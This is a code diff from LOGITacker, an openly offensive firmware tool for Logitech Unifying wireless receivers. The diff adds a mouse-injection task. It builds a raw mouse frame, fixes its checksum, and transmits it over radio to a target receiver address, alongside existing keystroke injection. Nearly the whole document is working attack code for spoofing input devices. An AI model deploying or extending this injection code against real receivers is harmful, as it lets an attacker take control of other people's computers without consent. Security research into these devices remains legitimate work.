@@ -305,6 +305,28 @@ void processor_inject_timer_handler_func_(logitacker_processor_inject_ctx_t *sel
                 //free_task(self->current_task);
                 break;
             }
+            case INJECT_TASK_TYPE_MOUSE:
+                NRF_LOG_INFO("inject mouse");
+                // nrf_esb_payload_t tmp_tx_payload;
+                // memset(&tmp_tx_payload, 0, sizeof(tmp_tx_payload));
+                // tmp_tx_payload.length = 8;
+                uint8_t payload[] = { 0x00, 0xC2, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+                memcpy(self->tmp_tx_payload.data, payload, sizeof(payload));
+                self->tmp_tx_payload.length = sizeof(payload);
+
+                logitacker_unifying_payload_update_checksum(self->tmp_tx_payload.data, self->tmp_tx_payload.length);
+                if (nrf_esb_write_payload(&self->tmp_tx_payload) != NRF_SUCCESS) {
+                    NRF_LOG_INFO("Error writing payload");
+                } else {
+                    nrf_esb_convert_pipe_to_address(self->tmp_tx_payload.pipe, tmp_addr);
+                    helper_addr_to_hex_str(addr_str_buff, 5, tmp_addr);
+                    NRF_LOG_DEBUG("TX'ed to %s", nrf_log_push(addr_str_buff));
+
+                    // self->current_task.finished = true;
+                    transfer_state(self, INJECT_STATE_TASK_SUCCEEDED);
+                    // free_task(self->current_task);
+                }
+                break;
             case INJECT_TASK_TYPE_PRESS_KEYS:
             case INJECT_TASK_TYPE_TYPE_STRING:
             case INJECT_TASK_TYPE_TYPE_ALTSTRING: {
@@ -634,6 +656,28 @@ void logitacker_processor_inject_start_execution(logitacker_processor_t *p_proce
 
     self->execute = execute;
     if (self->execute) logitacker_processor_inject_run_next_task(self);
+}
+
+void logitacker_processor_inject_mouse(logitacker_processor_t *p_processor_inject) {
+    NRF_LOG_INFO("logitacker_processor_inject_mouse()");
+    if (p_processor_inject == NULL) {
+        NRF_LOG_ERROR("logitacker processor is NULL");
+        return;
+    }
+
+    logitacker_processor_inject_ctx_t *self = (logitacker_processor_inject_ctx_t *) p_processor_inject->p_ctx;
+    if (self == NULL) {
+        NRF_LOG_ERROR("logitacker processor inject context is NULL");
+        return;
+    }
+
+    self->current_task.type = INJECT_TASK_TYPE_MOUSE;
+    self->execute = true;
+
+    transfer_state(self, INJECT_STATE_WORKING);
+
+    //start injection
+    app_timer_start(self->timer_next_action, APP_TIMER_TICKS(self->tx_delay_ms), NULL);
 }
 
 logitacker_processor_t *new_processor_inject(uint8_t const *target_rf_address, app_timer_id_t timer_next_action) {
